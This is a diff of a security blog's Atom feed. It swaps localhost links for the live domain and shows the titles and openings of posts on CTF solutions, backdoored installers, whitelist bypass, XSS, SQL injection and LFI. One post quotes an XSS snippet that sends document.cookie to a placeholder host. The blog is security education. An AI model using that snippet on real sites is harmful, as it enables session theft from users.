@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
  <title>The blog of Riley Kidd</title>
- <link href="http://0.0.0.0:4000/atom.xml" rel="self"/>
- <link href="http://0.0.0.0:4000"/>
- <updated>2020-05-18T20:35:49-05:00</updated>
- <id>http://0.0.0.0:4000</id>
+ <link href="https://rileykidd.com/atom.xml" rel="self"/>
+ <link href="https://rileykidd.com"/>
+ <updated>2020-05-18T20:46:37-05:00</updated>
+ <id>https://rileykidd.com</id>
  <author>
    <name>Riley Kidd</name>
    <email></email>
@@ -12,9 +12,9 @@
  
  <entry>
    <title>Solving CTF challenges with DLL injection</title>
-   <link href="http://0.0.0.0:4000/2018/07/08/solving-CTF-challenges-with-DLL-injection/"/>
+   <link href="https://rileykidd.com/2018/07/08/solving-CTF-challenges-with-DLL-injection/"/>
    <updated>2018-07-08T04:30:00-05:00</updated>
-   <id>http://0.0.0.0:4000/2018/07/08/Solving-CTF_challenges-with-DLL-injection</id>
+   <id>https://rileykidd.com/2018/07/08/Solving-CTF_challenges-with-DLL-injection</id>
    <content type="html">&lt;h2 id=&quot;the-game&quot;&gt;The game&lt;/h2&gt;
 &lt;p&gt;A reversing CTF challenge which has long been on my TODO list to solve is &lt;code class=&quot;highlighter-rouge&quot;&gt;RockPaperScissorsLizardSpock_v0.3.exe&lt;/code&gt;, which was designed and created by ex-colleague of mine, &lt;a href=&quot;https://twitter.com/thicenl&quot;&gt;Thijs&lt;/a&gt; back in 2014. 
 The challenge requires you to play a customised version of “Rock-Paper-Scissors” with two additional movements “Lizard-Spock”.&lt;/p&gt;
@@ -276,9 +276,9 @@ The challenge requires you to play a customised version of “Rock-Paper-Scissor
  
  <entry>
    <title>A watering hole with Windows binaries</title>
-   <link href="http://0.0.0.0:4000/2017/10/17/a-watering-hole-with-Windows-binaries/"/>
+   <link href="https://rileykidd.com/2017/10/17/a-watering-hole-with-Windows-binaries/"/>
    <updated>2017-10-17T04:30:00-05:00</updated>
-   <id>http://0.0.0.0:4000/2017/10/17/a-watering-hole-with-Windows-binaries</id>
+   <id>https://rileykidd.com/2017/10/17/a-watering-hole-with-Windows-binaries</id>
    <content type="html">&lt;h2 id=&quot;the-watering-hole&quot;&gt;The watering hole&lt;/h2&gt;
 &lt;p&gt;A &lt;a href=&quot;https://en.wikipedia.org/wiki/Watering_hole_attack&quot;&gt;watering hole attack&lt;/a&gt; is an approach which permits us to target specific groups of users. The basic setup is to abuse regular user behaviour via a trusted source. For example, if we gain access to a web server hosting &lt;a href=&quot;https://technet.microsoft.com/en-us/library/cc978328.aspx&quot;&gt;MSI installation files&lt;/a&gt;, which we know are downloaded and executed by our target group - we can backdoor these files. The next time this trusted file is downloaded, our backdoor will be executed.&lt;/p&gt;
 
@@ -392,9 +392,9 @@ RunProgram=&quot;install.exe&quot;
  
  <entry>
    <title>Application whitelist bypass using XLL and embedded shellcode</title>
-   <link href="http://0.0.0.0:4000/2017/08/03/application-whitelist-bypass-using-XLL-and-embedded-shellcode/"/>
+   <link href="https://rileykidd.com/2017/08/03/application-whitelist-bypass-using-XLL-and-embedded-shellcode/"/>
    <updated>2017-08-03T02:09:18-05:00</updated>
-   <id>http://0.0.0.0:4000/2017/08/03/application-whitelist-bypass-using-XLL-and-embedded-shellcode</id>
+   <id>https://rileykidd.com/2017/08/03/application-whitelist-bypass-using-XLL-and-embedded-shellcode</id>
    <content type="html">&lt;h2 id=&quot;application-whitelisting&quot;&gt;Application whitelisting&lt;/h2&gt;
 
 &lt;p&gt;Application whitelisting tools such as Microsoft’s &lt;a href=&quot;https://technet.microsoft.com/en-us/library/dd723678(v=ws.10).aspx&quot;&gt;AppLocker&lt;/a&gt; provide an effective way to prevent users from executing unauthorised applications. Via these tools Administrators can whitelist an approved list of application publishers, paths or file hashes. If an application does not fall under this approved whitelist, it cannot be executed.&lt;/p&gt;
@@ -475,9 +475,9 @@ RunProgram=&quot;install.exe&quot;
  
  <entry>
    <title>Creating a multiport man-in-the-middle network tap</title>
-   <link href="http://0.0.0.0:4000/2016/11/21/creating-a-multiport-man-in-the-middle-network-tap/"/>
+   <link href="https://rileykidd.com/2016/11/21/creating-a-multiport-man-in-the-middle-network-tap/"/>
    <updated>2016-11-21T02:29:24-06:00</updated>
-   <id>http://0.0.0.0:4000/2016/11/21/creating-a-multiport-man-in-the-middle-network-tap</id>
+   <id>https://rileykidd.com/2016/11/21/creating-a-multiport-man-in-the-middle-network-tap</id>
    <content type="html">&lt;h1 id=&quot;the-problem&quot;&gt;The problem&lt;/h1&gt;
 
 &lt;p&gt;During red teaming, once physical access has been obtained a typical next step is to connect to the internal network. While many tools (such as cobalt strike) provide excellent logging functionality, other tools are somewhat lacking. A solution to this problem is to locally log all network traffic thereby providing a complete overview of all actions performed on the network.&lt;/p&gt;
@@ -651,9 +651,9 @@ tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; br0 &lt;span class=&quo
  
  <entry>
    <title>Hack in the Box 2016 - MISC400 Writeup (Part 1)</title>
-   <link href="http://0.0.0.0:4000/2016/06/09/hack-in-the-box-2016-misc400-writeup-part-1/"/>
+   <link href="https://rileykidd.com/2016/06/09/hack-in-the-box-2016-misc400-writeup-part-1/"/>
    <updated>2016-06-09T01:19:00-05:00</updated>
-   <id>http://0.0.0.0:4000/2016/06/09/hack-in-the-box-2016-misc400-writeup-part-1</id>
+   <id>https://rileykidd.com/2016/06/09/hack-in-the-box-2016-misc400-writeup-part-1</id>
    <content type="html">&lt;h2 id=&quot;the-challenge&quot;&gt;The challenge&lt;/h2&gt;
 
 &lt;p&gt;This year the CTF prize sponsors &lt;a href=&quot;http://www.beyondsecurity.com/&quot;&gt;Beyond Security&lt;/a&gt; contributed a 400 point challenge:&lt;/p&gt;
@@ -993,9 +993,9 @@ for a in *.tar.gz; do tar -zxvf $a; done
  
  <entry>
    <title>Synology NAS DSM 5.2 Remote Code Execution (RCE)</title>
-   <link href="http://0.0.0.0:4000/2016/01/12/synology-nas-dsm-5-2-remote-code-execution-rce/"/>
+   <link href="https://rileykidd.com/2016/01/12/synology-nas-dsm-5-2-remote-code-execution-rce/"/>
    <updated>2016-01-12T13:09:18-06:00</updated>
-   <id>http://0.0.0.0:4000/2016/01/12/synology-nas-dsm-5-2-remote-code-execution-rce</id>
+   <id>https://rileykidd.com/2016/01/12/synology-nas-dsm-5-2-remote-code-execution-rce</id>
    <content type="html">&lt;p&gt;&lt;a href=&quot;/assets/images/1.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/1.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;tldr&quot;&gt;TLDR&lt;/h2&gt;
@@ -1343,9 +1343,9 @@ tar -xvf hda1.tgz
  
  <entry>
    <title>How to add an XSS-able bot to your CTF</title>
-   <link href="http://0.0.0.0:4000/2015/05/06/how-to-add-an-xss-able-bot-to-your-ctf/"/>
+   <link href="https://rileykidd.com/2015/05/06/how-to-add-an-xss-able-bot-to-your-ctf/"/>
    <updated>2015-05-05T21:31:35-05:00</updated>
-   <id>http://0.0.0.0:4000/2015/05/06/how-to-add-an-xss-able-bot-to-your-ctf</id>
+   <id>https://rileykidd.com/2015/05/06/how-to-add-an-xss-able-bot-to-your-ctf</id>
    <content type="html">&lt;p&gt;During CTF events it can be interesting to provide XSS challenges for players to solve. This post will discuss automating the process of executing user supplied JavaScript - aka running XSS-able bots within a CTF environment.&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;http://phantomjs.org/&quot; target=&quot;_blank&quot;&gt;PhantomJS&lt;/a&gt; is a headless WebKit useful for automating tasks such as functional or display testing. Another use we can adapt PhantomJS for is to visit web pages known to contain user supplied JavaScript and executing these payloads.&lt;/p&gt;
@@ -1424,9 +1424,9 @@ tar -xvf hda1.tgz
  
  <entry>
    <title>Hack in the box teaser 2015 : Forensics 1000</title>
-   <link href="http://0.0.0.0:4000/2015/05/01/hack-in-the-box-teaser-2015-forensics-1000/"/>
+   <link href="https://rileykidd.com/2015/05/01/hack-in-the-box-teaser-2015-forensics-1000/"/>
    <updated>2015-04-30T19:06:37-05:00</updated>
-   <id>http://0.0.0.0:4000/2015/05/01/hack-in-the-box-teaser-2015-forensics-1000</id>
+   <id>https://rileykidd.com/2015/05/01/hack-in-the-box-teaser-2015-forensics-1000</id>
    <content type="html">&lt;p&gt;In preparation for the Amsterdam Hack in the box CTF this year I took a look at the Forensics 1000 challenge, the description of which you can find below.&lt;/p&gt;
 
 &lt;blockquote&gt;
@@ -1591,9 +1591,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>The hash that never was</title>
-   <link href="http://0.0.0.0:4000/2014/02/11/the-hash-that-never-was/"/>
+   <link href="https://rileykidd.com/2014/02/11/the-hash-that-never-was/"/>
    <updated>2014-02-11T03:56:37-06:00</updated>
-   <id>http://0.0.0.0:4000/2014/02/11/the-hash-that-never-was</id>
+   <id>https://rileykidd.com/2014/02/11/the-hash-that-never-was</id>
    <content type="html">&lt;p&gt;It’s a familiar situation, you’ve found some vulnerability and popped a limited shell.&lt;/p&gt;
 
 &lt;p&gt;You’ve enumerated services, the kernel, applications, plugins, the distribution, jobs, configs, file permissions, etc, etc - but you can’t find a feasible way to escalate your privileges.&lt;/p&gt;
@@ -1636,9 +1636,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>The friendly phisherman</title>
-   <link href="http://0.0.0.0:4000/2014/01/31/the-friendly-phisherman/"/>
+   <link href="https://rileykidd.com/2014/01/31/the-friendly-phisherman/"/>
    <updated>2014-01-31T06:42:36-06:00</updated>
-   <id>http://0.0.0.0:4000/2014/01/31/the-friendly-phisherman</id>
+   <id>https://rileykidd.com/2014/01/31/the-friendly-phisherman</id>
    <content type="html">&lt;p&gt;While technical resilience to security can be quantitatively tested and evaluated at some point in time. The human factor is often a weak point which is difficult to assess, even more difficult to rely upon (consistently) and can result in &lt;a href=&quot;https://medium.com/p/24eb09e026dd&quot;&gt;compromise&lt;/a&gt; even where technical issues have been addressed.&lt;/p&gt;
 
 &lt;p&gt;A simple way to test organisational resilience or the effectiveness of staff security awareness training is to perform social engineering exercises. While areas such as physical access, cold drops and phone calls all fall under this remit (among others), this post will focus on a technique with a very low barrier of entry and expertise – phishing.&lt;/p&gt;
@@ -1746,9 +1746,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>Using XSS to CSRF</title>
-   <link href="http://0.0.0.0:4000/2013/09/09/using-xss-to-csrf/"/>
+   <link href="https://rileykidd.com/2013/09/09/using-xss-to-csrf/"/>
    <updated>2013-09-09T03:56:07-05:00</updated>
-   <id>http://0.0.0.0:4000/2013/09/09/using-xss-to-csrf</id>
+   <id>https://rileykidd.com/2013/09/09/using-xss-to-csrf</id>
    <content type="html">&lt;p&gt;I’ve spoken before about &lt;a href=&quot;http://rileykidd.com/2013/08/26/stealing-cookies-with-sql/&quot;&gt;leveraging an sql inection to perform an xss attack&lt;/a&gt; and this post will discuss another form of attack chaining - exploiting an xss vulnerability to bypass csrf protection.&lt;/p&gt;
 
 &lt;p&gt;As an example, let’s assume we have found an xss vulnerability and wish to create some &lt;a href=&quot;http://en.wikipedia.org/wiki/Samy_(computer_worm)&quot; target=&quot;_blank&quot;&gt;xss worm&lt;/a&gt; attack against users.&lt;/p&gt;
@@ -1833,9 +1833,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>Stealing cookies with SQL</title>
-   <link href="http://0.0.0.0:4000/2013/08/26/stealing-cookies-with-sql/"/>
+   <link href="https://rileykidd.com/2013/08/26/stealing-cookies-with-sql/"/>
    <updated>2013-08-26T13:53:49-05:00</updated>
-   <id>http://0.0.0.0:4000/2013/08/26/stealing-cookies-with-sql</id>
+   <id>https://rileykidd.com/2013/08/26/stealing-cookies-with-sql</id>
    <content type="html">&lt;p&gt;The more common areas to test for and find SQL injection vulnerabilities is via &lt;code class=&quot;highlighter-rouge&quot;&gt;$_GET&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;$_POST&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt;s. This post will discuss another potential vector - &lt;code class=&quot;highlighter-rouge&quot;&gt;$_SERVER&lt;/code&gt;. Once identified, we will explore how to pivot across an SQL injection to steal cookie data.&lt;/p&gt;
 
 &lt;p&gt;A thorough authentication system includes user history logs - a trivial example is shown below (for the sake of simplicity, we assume application users are comfortable reading raw epoch data).&lt;/p&gt;
@@ -1895,9 +1895,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>The backdoor you didn't grep</title>
-   <link href="http://0.0.0.0:4000/2013/08/21/the-backdoor-you-didnt-grep/"/>
+   <link href="https://rileykidd.com/2013/08/21/the-backdoor-you-didnt-grep/"/>
    <updated>2013-08-21T09:15:16-05:00</updated>
-   <id>http://0.0.0.0:4000/2013/08/21/the-backdoor-you-didnt-grep</id>
+   <id>https://rileykidd.com/2013/08/21/the-backdoor-you-didnt-grep</id>
    <content type="html">&lt;p&gt;I’ve previously discussed &lt;a href=&quot;/2013/06/17/modern-malware-the-game-of-cat-and-mouse/&quot;&gt;the game of cat and mouse&lt;/a&gt; played between attackers and defenders in the malware domain. Today, I will take a similar (albeit more offensive) approach to analysing this hide-and-seek game between web attackers and defenders.&lt;/p&gt;
 
 &lt;p&gt;We start with the familiar scenario - someone has breached your server, what’s their next step?&lt;/p&gt;
@@ -1981,9 +1981,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>Why come inside, if I can stand out front?</title>
-   <link href="http://0.0.0.0:4000/2013/08/19/why-come-inside-if-i-can-stand-out-front/"/>
+   <link href="https://rileykidd.com/2013/08/19/why-come-inside-if-i-can-stand-out-front/"/>
    <updated>2013-08-19T13:42:40-05:00</updated>
-   <id>http://0.0.0.0:4000/2013/08/19/why-come-inside-if-i-can-stand-out-front</id>
+   <id>https://rileykidd.com/2013/08/19/why-come-inside-if-i-can-stand-out-front</id>
    <content type="html">&lt;p&gt;A busines’ wireless access points offer the potential as a simple vector for network ingress by an attacker. They don’t require specific vulnerabilities, physical access or end user engagement.&lt;/p&gt;
 
 &lt;p&gt;All that is required is poor security configuration - either via the employed encryption standard or associated passwords.&lt;/p&gt;
@@ -2094,9 +2094,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>Malware – The game of cat and mouse</title>
-   <link href="http://0.0.0.0:4000/2013/06/17/modern-malware-the-game-of-cat-and-mouse/"/>
+   <link href="https://rileykidd.com/2013/06/17/modern-malware-the-game-of-cat-and-mouse/"/>
    <updated>2013-06-17T03:56:36-05:00</updated>
-   <id>http://0.0.0.0:4000/2013/06/17/modern-malware-the-game-of-cat-and-mouse</id>
+   <id>https://rileykidd.com/2013/06/17/modern-malware-the-game-of-cat-and-mouse</id>
    <content type="html">&lt;p&gt;Malware writers and malware researchers play a constant game of cat and mouse - one where the former consistently have the upper hand.&lt;/p&gt;
 
 &lt;p&gt;While there is some overlap, malware evasion techniques can be broadly categorised into 3 main areas with 3 main goals:&lt;/p&gt;
@@ -2142,9 +2142,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>Sniffing out Phishing</title>
-   <link href="http://0.0.0.0:4000/2013/06/11/sniffing-out-phishing/"/>
+   <link href="https://rileykidd.com/2013/06/11/sniffing-out-phishing/"/>
    <updated>2013-06-11T11:40:14-05:00</updated>
-   <id>http://0.0.0.0:4000/2013/06/11/sniffing-out-phishing</id>
+   <id>https://rileykidd.com/2013/06/11/sniffing-out-phishing</id>
    <content type="html">&lt;p&gt;One simple method recommended to users to help detect phishing is to use the &lt;em&gt;hover trick&lt;/em&gt;, where a user hovers their cursor over a link to check their browser displays the domain they are expecting - if the link appears to be correct, click away.&lt;/p&gt;
 
 &lt;p&gt;Consider the following html which simply links to &lt;a href=&quot;http://wikipedia.org/&quot; title=&quot;Wikipedia&quot; target=&quot;_blank&quot;&gt;Wikipedia&lt;/a&gt; and &lt;a href=&quot;http://yahoo.com&quot; title=&quot;Yahoo&quot; target=&quot;_blank&quot;&gt;Yahoo&lt;/a&gt;.&lt;/p&gt;
@@ -2172,9 +2172,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>The XSS who watched me</title>
-   <link href="http://0.0.0.0:4000/2013/06/06/the-xss-who-watched-me/"/>
+   <link href="https://rileykidd.com/2013/06/06/the-xss-who-watched-me/"/>
    <updated>2013-06-06T06:43:58-05:00</updated>
-   <id>http://0.0.0.0:4000/2013/06/06/the-xss-who-watched-me</id>
+   <id>https://rileykidd.com/2013/06/06/the-xss-who-watched-me</id>
    <content type="html">&lt;p&gt;A common XSS based attack involves stealing users authenticated session cookies. This can be achieved by exploiting an XSS vector and injecting code, using a method such as:&lt;/p&gt;
 
 &lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://www.example.com/s.php?cookie=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -2320,9 +2320,9 @@ mount &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rw &lt;span class=&quot;n
  
  <entry>
    <title>I found an LFI, now what?</title>
-   <link href="http://0.0.0.0:4000/2013/06/05/i-found-an-lfi-now-what/"/>
+   <link href="https://rileykidd.com/2013/06/05/i-found-an-lfi-now-what/"/>
    <updated>2013-06-05T09:44:30-05:00</updated>
-   <id>http://0.0.0.0:4000/2013/06/05/i-found-an-lfi-now-what</id>
+   <id>https://rileykidd.com/2013/06/05/i-found-an-lfi-now-what</id>
    <content type="html">&lt;p&gt;Local File Inclusions (LFIs) allow an attacker to include arbitrary files on the victim machine. These files are interpreted as being part of the current page, interpreted as code and returned to the user.&lt;/p&gt;
 
 &lt;p&gt;Consider this php snippet which is vulnerable to an LFI attack:&lt;/p&gt;
